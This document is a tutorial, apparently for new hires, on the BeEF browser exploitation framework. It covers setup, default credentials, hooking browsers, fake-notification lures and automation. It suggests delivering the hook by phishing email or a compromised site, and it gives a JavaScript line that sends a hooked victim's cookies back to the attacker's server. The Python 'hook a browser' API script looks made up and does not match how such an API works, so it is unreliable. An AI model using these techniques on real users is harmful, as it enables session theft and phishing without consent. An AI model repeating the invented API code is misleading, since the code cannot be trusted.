### BeEF (Browser Exploitation Framework) Tutorial for New Hires

**Disclaimer**: Use BeEF responsibly and only on systems where you have explicit permission to perform security testing.

### Step 1: Setting Up BeEF

#### Prerequisites
1. **Kali Linux**: BeEF comes pre-installed on Kali Linux. You can also install it on other Linux distributions, but for this tutorial, we will use Kali Linux.
2. **Internet Connection**: Required for downloading updates and additional modules.
3. **Administrative Privileges**: Required to install and run BeEF.

#### Installation on Kali Linux
BeEF is included in Kali Linux, but if it's not up-to-date, you can update it using the following commands:

```bash
sudo apt update
sudo apt install beef-xss
```

### Step 2: Starting BeEF

1. **Open a Terminal**: Launch a terminal in Kali Linux.
2. **Start BeEF**: Run the following command to start BeEF:

   ```bash
   sudo beef-xss
   ```

3. **Access BeEF Web Interface**:
   - Open a web browser and navigate to `http://localhost:3000/ui/panel`.
   - Use the default credentials to log in:
     - **Username**: beef
     - **Password**: beef

### Step 3: Understanding the Interface

Once logged in, you will see the BeEF control panel. Here are the main components:

1. **Hooks**: This section lists all the hooked browsers. A "hooked browser" is one that has executed the BeEF hook script.
2. **Commands**: This section contains various modules that you can use to interact with the hooked browsers.
3. **Logs**: This section logs all activities and interactions.

### Step 4: Hooking a Browser

To hook a browser, you need to make the target browser execute a small JavaScript payload.

#### Generating the Hook URL
1. In the BeEF control panel, go to the **Hook URL** section.
2. You will see a URL like `http://<your-ip>:3000/hook.js`.

#### Delivering the Hook
There are several ways to deliver the hook:
1. **Phishing Email**: Embed the hook URL in an email.
2. **Compromised Website**: Add the hook URL to a website you control.
3. **Social Engineering**: Use various social engineering techniques to get the target to visit the URL.

**Example**:
For demonstration purposes, you can open another browser on your local machine and navigate to `http://localhost:3000/demos/basic.html`. This page contains the hook script.

### Step 5: Exploiting the Hooked Browser

Once the target browser is hooked, it will appear in the **Hooks** section.

#### Running Commands
1. **Select the Hooked Browser**: Click on the browser entry in the Hooks section.
2. **Choose a Command Module**: Navigate to the Commands section and select a module. For example, choose `Social Engineering` > `Fake Notification`.
3. **Execute the Command**: Fill in the required parameters and click on `Execute`.

**Example**:
- **Module**: Fake Notification
- **Parameters**: 
  - Title: "Security Alert"
  - Text: "Your session has expired. Please log in again."
- **Execute**: This will display a fake notification on the hooked browser.

### Step 6: Analyzing Results

The output of each executed command can be viewed in the Logs section or directly within the command module interface. This helps you understand what happened on the target browser.

### Step 7: Custom Payloads and Scripts

BeEF allows you to write custom JavaScript payloads for specific tasks.

**Example**:
- **Task**: Steal cookies from the hooked browser.
- **Custom Script**:

  ```javascript
  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies='+document.cookie);
  ```

- **Execution**: Use the Custom JavaScript command module to execute this script.

### Step 8: Automating Tasks with BeEF API

BeEF provides an API for automating tasks and integrating with other tools.

**Example**:
- **API Request**: Hook a browser and execute a command automatically.
- **Script**:

  ```python
  import requests

  beef_url = "http://localhost:3000"
  api_token = "your_api_token"

  def hook_browser(url):
      hook_url = f"{beef_url}/api/hooks?token={api_token}"
      response = requests.post(hook_url, data={'url': url})
      return response.json()

  def execute_command(session_id, module, command):
      command_url = f"{beef_url}/api/modules/{session_id}/{module}?token={api_token}"
      response = requests.post(command_url, data=command)
      return response.json()

  # Hook a browser
  hook_response = hook_browser("http://target-site.com")
  session_id = hook_response['session_id']

  # Execute a command
  command_response = execute_command(session_id, "Fake Notification", {'title': 'Alert', 'text': 'Your session has expired.'})
  ```

### Conclusion

BeEF is a versatile and powerful tool for testing browser security. By following this tutorial, you should now have a basic understanding of how to set up and use BeEF, hook browsers, execute commands, and analyze results. Always remember to use BeEF ethically and within legal boundaries.

